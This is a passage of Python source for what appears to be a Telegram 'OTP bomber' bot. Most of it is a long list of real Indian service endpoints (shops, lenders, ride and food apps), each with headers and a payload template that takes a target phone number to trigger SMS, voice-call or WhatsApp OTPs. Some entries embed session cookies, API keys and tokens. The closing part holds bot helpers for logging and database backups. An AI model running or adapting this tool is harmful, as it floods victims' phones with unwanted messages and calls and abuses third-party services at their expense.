        "data": lambda p: f'{{"actionRequestContext": {{"type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{p}", "clientQueryParamMap": {{"ret": "/?cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=CjwKCAiAqY6tBhAtEiwAHeRopXAJTIrS2X5hOOJmzNAsD6nHlHPQKbsgdim8CouDsrnvUxhaD9NpyhoCNWQQAvD_BwE", "entryPage": "HEADER_ACCOUNT"}}, "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "sourceContext": "DEFAULT"}}}}',
    },
    {
        "name": 'Royal Challengers Login',
        "type": 'SMS',
        "url": 'https://shop.royalchallengers.com/api/customer/login',
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"utype": "Online", "mobile": "{p}", "email": ""}}',
    },
    {
        "name": 'Docon Online Login',
        "type": 'SMS',
        "url": 'https://docon.co.in/api/v1/user/online-login',
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"mobileNumber": "{p}"}}',
    },
    {
        "name": 'Dhurina Send OTP',
        "type": 'SMS',
        "url": 'https://intapi.dhurina.net/api/send_otp',
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Rappi MX Grability',
        "type": 'SMS',
        "url": 'https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create',
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"country_code": "+91", "phone": "{p}"}}',
    },
    {
        "name": 'TrulyMadly',
        "type": 'SMS',
        "url": 'https://app.trulymadly.com/api/auth/mobile/v1/send-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}", "locale": "IN"}}',
    },
    {
        "name": 'Apna',
        "type": 'SMS',
        "url": 'https://production.apna.co/api/userprofile/v1/otp/',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}", "hash_type": "play_store"}}',
    },
    {
        "name": 'CodFirm',
        "type": 'SMS',
        "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'Swipe',
        "type": 'SMS',
        "url": 'https://app.getswipe.in/api/user/mobile_login',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}", "resend": true}}',
    },
    {
        "name": 'More Retail',
        "type": 'SMS',
        "url": 'https://omni-api.moreretail.in/api/v1/login/',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}", "hash_key": "XfsoCeXADQA"}}',
    },
    {
        "name": 'Country Delight',
        "type": 'SMS',
        "url": 'https://api.countrydelight.in/api/v1/customer/requestOtp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}", "platform": "Android", "mode": "new_user"}}',
    },
    {
        "name": 'AstroSage',
        "type": 'SMS',
        "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'Rapido',
        "type": 'SMS',
        "url": 'https://customer.rapido.bike/api/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'TooToo',
        "type": 'SMS',
        "url": 'https://tootoo.in/graphql',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"query": "query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }}}}", "variables": {{"mobile_no": "{p}", "resend": 0}}}}',
    },
    {
        "name": 'ConfirmTkt',
        "type": 'SMS',
        "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'BetterHalf',
        "type": 'SMS',
        "url": 'https://api.betterhalf.ai/v2/auth/otp/send/',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}", "isd_code": "91"}}',
    },
    {
        "name": 'Nuvama Wealth',
        "type": 'SMS',
        "url": 'https://nma.nuvamawealth.com/edelmw-content/content/otp/register',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobileNo": "{p}", "emailID": "test@example.com"}}',
    },
    {
        "name": 'Mpokket',
        "type": 'SMS',
        "url": 'https://web-api.mpokket.in/registration/sendOtp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Jockey Send OTP SMS',
        "type": 'SMS',
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
        "method": 'GET',
        "headers": {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36', 'accept': '*/*', 'referer': 'https://www.jockey.in/', 'accept-encoding': 'gzip, deflate, br, zstd', 'accept-language': 'en-US,en;q=0.9,bn;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5'},
        "data": None,
    },
    {
        "name": 'SmartCoin OTP Verification',
        "type": 'SMS',
        "url": lambda p: f"https://webapp.smartcoin.co.in/users/null/otpVerification/requestOtp/REGISTRATION/SMS?phoneNumber={p}&name=null&device_id=null&android_id=c7abc1fd7459e84c&rooted=0&locale=en&app_instance_id=null&google_ad_id=d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785&app_store_key=google_play_store&fcm_token=f_u1nGSLRQ2c2Cw_ZhmvpP%3AAPA91bHQCmiwzyRb8-QHmVN16n6-jjFC8lxp_sz1c91l4-1_6osymmD2ZLWcGkXAodp99QUr6DocUFBdZs0kGanjToDUxNCDlRxGKpj7qG9pklXloBNVhHdCo4FsN7YjZFbLVYn5AdtW&fb_ref=null&utm_source=client_unknown&utm_campaign=client_unknown&app_version=562&id_token=null&phone_number={p}",
        "method": 'GET',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1'},
        "data": None,
    },
    {
        "name": 'UCO Online Send Message',
        "type": 'SMS',
        "url": lambda p: f"https://apps.ucoonline.in/Lead_App/send_message.jsp?mob=&ref_no=&otpv=&appRefNo=&lgName=fdgefgdgg&lgAddress=dfgdsggfesdggg&lgPincode=695656&lgState=DL&lgDistrict=NORTH+DELHI&lgBranch=0313&lgMobileno={p}&lgEmail=sundeshaakshays%40gmail.com&lgFacilities=CC&lgTentAmt=656556565&lgRemarks=efwfwfsafw&declare_check=on&captchaRefno=315904&captchaResult=71&firstName=Gjgjgjgv&password=ghfughdsy-5_33%23&requestType=SENDOTP&mobileNumber={p}&login=gjghgug%40gmail.com&genderType=Male",
        "method": 'GET',
        "headers": {'referer': 'https://apps.ucoonline.in/Lead_App/lead_web.jsp', 'cookie': 'JSESSIONID=9AF635F323A70A62FDE04FB64FD56F78.apps1', 'origin': 'https://apps.ucoonline.in', 'accept': '*/*', 'x-requested-with': 'XMLHttpRequest', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36', 'host': 'apps.ucoonline.in', 'connection': 'Keep-Alive', 'accept-encoding': 'gzip'},
        "data": None,
    },
    {
        "name": 'Doubtnut Send Call OTP',
        "type": 'Call',
        "url": 'https://micro.doubtnut.com/otp/send-call',
        "method": 'PUT',
        "headers": {'version_code': '1260', 'has_upi': 'false', 'device_model': 'ASUS_I005DA', 'android_sdk_version': '29', 'content-type': 'application/json; charset=utf-8', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/4.0.0-alpha.2'},
        "data": lambda p: f'{{"phone": "{p}", "locale": "en"}}',
    },
    {
        "name": 'Snapdeal Send OTP',
        "type": 'SMS',
        "url": 'https://m.snapdeal.com/sendOTP',
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"purpose": "LOGIN_WITH_MOBILE_OTP", "mobileNumber": "{p}"}}',
    },
    {
        "name": 'Dream11 Passwordless Init',
        "type": 'SMS',
        "url": 'https://www.dream11.com/auth/passwordless/init',
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"phoneNumber": "{p}", "templateName": "default", "channel": "sms", "flow": "SIGNIN"}}',
    },
    {
        "name": 'TradeIndia App Login',
        "type": 'SMS',
        "url": 'https://apis.tradeindia.com/app_login_api/login_app',
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"mobile": ",{p}"}}',
    },
    {
        "name": 'Unacademy User Check',
        "type": 'SMS',
        "url": 'https://unacademy.com/api/v3/user/user_check/?enable-email=true',
        "method": 'POST',
        "headers": {'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8', 'accept-encoding': 'gzip'},
        "data": lambda p: f'{{"country_code": "IN", "phone": "{p}", "is_un_teach_user": false, "otp_type": 1, "send_otp": true, "email": ""}}',
    },
    {
        "name": 'Shemaroome',
        "type": 'SMS',
        "url": 'https://www.shemaroome.com/users/resend_otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
        "data": lambda p: f'"mobile_no=%2B91{p}"',
    },
    {
        "name": 'Cossouq',
        "type": 'SMS',
        "url": 'https://www.cossouq.com/mobilelogin/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'"mobilenumber={p}&otptype=register"',
    },
    {
        "name": 'MyImagineStore',
        "type": 'SMS',
        "url": 'https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
        "data": lambda p: f'"mobile={p}"',
    },
    {
        "name": 'Otpless',
        "type": 'SMS',
        "url": 'https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}", "selectedCountryCode": "+91"}}',
    },
    {
        "name": 'myhubble',
        "type": 'SMS',
        "url": 'https://api.myhubble.money/v1/auth/otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phoneNumber": "{p}", "channel": "SMS"}}',
    },
    {
        "name": 'tatacapital',
        "type": 'SMS',
        "url": 'https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobileNumber": "{p}", "deviceOs": "Android", "sourceName": "MitayeFaasleWebsite", "isOdFlow": "no", "deviceInfo": "Windows Web Browser"}}',
    },
    {
        "name": 'dealshare',
        "type": 'SMS',
        "url": 'https://services.dealshare.in/userservice/api/v1/user-login/send-login-code',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}", "hashCode": "k387IsBaTmn", "resendOtp": false, "app": "android", "loginType": "8a18d60e0029e806"}}',
    },
    {
        "name": 'snapmint',
        "type": 'SMS',
        "url": 'https://api.snapmint.com/v1/public/sign_up',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'housing',
        "type": 'SMS',
        "url": 'https://login.housing.com/api/v2/send-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "country_url_name": "in"}}',
    },
    {
        "name": 'rentomojo',
        "type": 'SMS',
        "url": 'https://www.rentomojo.com/api/RMUsers/isNumberRegistered',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'khatabook',
        "type": 'SMS',
        "url": 'https://api.khatabook.com/v1/auth/request-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "app_signature": "wk+avHrHZf2"}}',
    },
    {
        "name": 'netmeds',
        "type": 'SMS',
        "url": lambda p: f"https://apiv2.netmeds.com/mst/rest/v1/id/details/?mobile={p}",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'nykaa',
        "type": 'SMS',
        "url": 'https://www.nykaa.com/app-api/index.php/customer/send_otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'"mobile_number={p}&source=sms&platform=ANDROID&domain=nykaa"',
    },
    {
        "name": 'rummycircle',
        "type": 'SMS',
        "url": 'https://www.rummycircle.com/api/fl/auth/v3/getOtp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "isPlaycircle": "72abdd9a-7038-41c0-a57d-d0022dac60da", "deviceName": "Android", "refCode": ""}}',
    },
    {
        "name": 'animall',
        "type": 'SMS',
        "url": 'https://animall.in/zap/auth/login',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "signupPlatform": "NATIVE_ANDROID"}}',
    },
    {
        "name": 'penpencil',
        "type": 'SMS',
        "url": 'https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "firstName": "txhjjcj", "lastName": "user"}}',
    },
    {
        "name": 'entri',
        "type": 'SMS',
        "url": 'https://entri.app/api/v3/users/check-phone/',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'cosmofeed',
        "type": 'SMS',
        "url": 'https://prod.api.cosmofeed.com/api/user/authenticate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "emailId": "user@example.com", "version": "1.4.28"}}',
    },
    {
        "name": 'aakash',
        "type": 'SMS',
        "url": 'https://antheapi.aakash.ac.in/api/generate-lead-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile_psid": "{p}", "mobile_number": "{p}", "activity_type": "aakash-myadmission", "webengageData": {{}}, "profile": "student", "whatsapp_opt_in": false}}',
    },
    {
        "name": 'revv',
        "type": 'SMS',
        "url": 'https://st-core-admin.revv.co.in/stCore/api/customer/v1/init',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "deviceType": "website", "appVersion": "1.0"}}',
    },
    {
        "name": 'dehaat',
        "type": 'SMS',
        "url": 'https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "client_id": "kisan-app"}}',
    },
    {
        "name": 'a23games',
        "type": 'SMS',
        "url": 'https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "device_id": "android_device", "model": "Google,Android SDK built for x86,10", "otp": "", "referBy": "", "signup": true, "version": "1.0.5"}}',
    },
    {
        "name": 'spencers',
        "type": 'SMS',
        "url": 'https://jiffy.spencers.in/user/auth/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'paymeindia',
        "type": 'SMS',
        "url": 'https://api.paymeindia.in/api/v2/authentication/phone_no_verify/',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "uniqueReferCode": "S10ePIIrbH3"}}',
    },
    {
        "name": 'shoppersstop',
        "type": 'SMS',
        "url": 'https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "type": "SIGNIN_WITH_MOBILE"}}',
    },
    {
        "name": 'hyuga',
        "type": 'SMS',
        "url": 'https://hyuga-auth-service.pratech.live/v1/auth/otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'bigcash',
        "type": 'SMS',
        "url": lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1",
        "method": 'GET',
        "headers": {'Referer': 'https://www.bigcash.live/games/poker'},
        "data": None,
    },
    {
        "name": 'lifestylestores',
        "type": 'SMS',
        "url": 'https://www.lifestylestores.com/in/en/mobilelogin/sendOTP',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"signInMobile": "{p}", "channel": "sms"}}',
    },
    {
        "name": 'workindia',
        "type": 'SMS',
        "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'pokerbaazi',
        "type": 'SMS',
        "url": 'https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "mfa_channels": "phno"}}',
    },
    {
        "name": 'kpnfresh',
        "type": 'SMS',
        "url": 'https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json', 'x-app-id': '32178bdd-a25d-477e-b8d5-60df92bc2587', 'x-user-journey-id': '7e4e8701-18c6-4ed7-b7f5-eb0a2ba2fbec', 'x-app-version': '3.0.3', 'User-Agent': 'okhttp/5.0.0-alpha.11'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'my11circle',
        "type": 'SMS',
        "url": 'https://www.my11circle.com/api/fl/auth/v3/getOtp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': '03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'mamaearth',
        "type": 'SMS',
        "url": 'https://auth.mamaearth.in/v1/auth/initiate-signup',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "referralCode": ""}}',
    },
    {
        "name": 'hometriangle',
        "type": 'SMS',
        "url": 'https://hometriangle.com/api/partner/xauth/signup/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'wellnessforever',
        "type": 'SMS',
        "url": 'https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\",\"otpchar\":\"UnVEVWZwNnJKL1o2ZlIrWHBUMDlYdz09\",\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsdW1lbi1qd3QiLCJzdWIiOjIxMiwiaWF0IjoxNTc0MTUwMTYzLCJleHAiOjE2MDU2ODYxNjN9.0b7PxovIcFiWayJduIklNs_0lidod2EkD0FcYEKaF5Q\",\"sourceid\":\"2\"}}"',
    },
    {
        "name": 'healthmug',
        "type": 'SMS',
        "url": 'https://api.healthmug.com/account/createotp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'vyaparapp',
        "type": 'SMS',
        "url": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}",
        "method": 'GET',
        "headers": {'User-Agent': 'okhttp/4.9.2'},
        "data": None,
    },
    {
        "name": 'kredily',
        "type": 'SMS',
        "url": 'https://app.kredily.com/ws/v1/accounts/send-otp/',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'tatamotors',
        "type": 'SMS',
        "url": 'https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "locationUrl": "https://cars.tatamotors.com", "reqBody": "sendOtp"}}',
    },
    {
        "name": 'moglix',
        "type": 'SMS',
        "url": 'https://apinew.moglix.com/nodeApi/v1/login/sendOTP',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "buildVersion": "24.0", "p": "android"}}',
    },
    {
        "name": 'mygov',
        "type": 'SMS',
        "url": lambda p: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=user&email=user@example.com&gateway=91&mobile={p}&gender=male",
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": None,
    },
    {
        "name": 'Tata Capital Voice Call',
        "type": 'Call',
        "url": 'https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "isOtpViaCallAtLogin": "true"}}',
    },
    {
        "name": '1MG Voice Call',
        "type": 'Call',
        "url": 'https://www.1mg.com/auth_api/v6/create_token',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"number": "{p}", "otp_on_call": true}}',
    },
    {
        "name": 'Swiggy Call Verification',
        "type": 'Call',
        "url": 'https://profile.swiggy.com/api/v3/app/request_call_verification',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Myntra Voice Call',
        "type": 'Call',
        "url": 'https://www.myntra.com/gw/mobile-auth/voice-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Flipkart Voice Call',
        "type": 'Call',
        "url": 'https://www.flipkart.com/api/6/user/voice-otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Amazon Voice Call',
        "type": 'Call',
        "url": 'https://www.amazon.in/ap/signin',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'"phone={p}&action=voice_otp"',
    },
    {
        "name": 'Paytm Voice Call',
        "type": 'Call',
        "url": 'https://accounts.paytm.com/signin/voice-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Zomato Voice Call',
        "type": 'Call',
        "url": 'https://www.zomato.com/php/o2_api_handler.php',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'"phone={p}&type=voice"',
    },
    {
        "name": 'MakeMyTrip Voice Call',
        "type": 'Call',
        "url": 'https://www.makemytrip.com/api/4/voice-otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Goibibo Voice Call',
        "type": 'Call',
        "url": 'https://www.goibibo.com/user/voice-otp/generate/',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Ola Voice Call',
        "type": 'Call',
        "url": 'https://api.olacabs.com/v1/voice-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Uber Voice Call',
        "type": 'Call',
        "url": 'https://auth.uber.com/v2/voice-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'KPN WhatsApp',
        "type": 'WhatsApp',
        "url": 'https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6',
        "method": 'POST',
        "headers": {'x-app-id': '66ef3594-1e51-4e15-87c5-05fc8208a20f', 'content-type': 'application/json; charset=UTF-8'},
        "data": lambda p: f'{{"notification_channel": "WHATSAPP", "phone_number": {{"country_code": "+91", "number": "{p}"}}}}',
    },
    {
        "name": 'Foxy WhatsApp',
        "type": 'WhatsApp',
        "url": 'https://www.foxy.in/api/v2/users/send_otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"user": {{"phone_number": "+91{p}"}}, "via": "whatsapp"}}',
    },
    {
        "name": 'Stratzy WhatsApp',
        "type": 'WhatsApp',
        "url": 'https://stratzy.in/api/web/whatsapp/sendOTP',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phoneNo": "{p}"}}',
    },
    {
        "name": 'Jockey WhatsApp',
        "type": 'WhatsApp',
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'Rappi WhatsApp',
        "type": 'WhatsApp',
        "url": 'https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"country_code": "+91", "phone": "{p}"}}',
    },
    {
        "name": 'Eka Care WhatsApp',
        "type": 'WhatsApp',
        "url": 'https://auth.eka.care/auth/init',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json; charset=UTF-8'},
        "data": lambda p: f'{{"payload": {{"allowWhatsapp": true, "mobile": "+91{p}"}}, "type": "mobile"}}',
    },
    {
        "name": 'ServeTel',
        "type": 'SMS',
        "url": 'https://api.servetel.in/v1/auth/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'},
        "data": lambda p: f'"mobile_number={p}"',
    },
    {
        "name": 'GoPink Cabs',
        "type": 'SMS',
        "url": 'https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
        "data": lambda p: f'"check_mobile_number=1&contact={p}"',
    },
]


async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    """All log-channel messages go out quoted."""
    try:
        await bot.send_message(LOG_CHANNEL_ID, q(text), parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

async def do_backup_send(bot: Bot, d: dict, reason: str = "auto"):
    """Send current JSON DB to the configured backup chat."""
    cfg = d.get("backup", DEFAULT_BACKUP)
    chat_id = cfg.get("chat_id") or LOG_CHANNEL_ID
    if not os.path.exists(_DATA_FILE):
        return False
    try:
        caption = (
            f"📦 <b>DATABASE BACKUP</b> ({reason})\n\n"
            f"📅 <b>Date:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
            f"📂 <b>File:</b> <code>{_DATA_FILE}</code>\n"
            f"🔖 <b>Version:</b> {_VERSION}"
        )
        await bot.send_document(
            chat_id=chat_id,
            document=FSInputFile(_DATA_FILE),
            caption=q(caption),
            parse_mode="HTML"
        )
        def _touch(dd):
            dd.setdefault("backup", DEFAULT_BACKUP.copy())
            dd["backup"]["last_backup_ts"] = int(time.time())
        atomic_update(_touch)
        log.info(f"Backup sent ({reason}) -> {chat_id}")
        return True
    except Exception as e:
        log.error(f"Backup send failed: {e}")
        return False

async def background_backup_sender(bot: Bot):
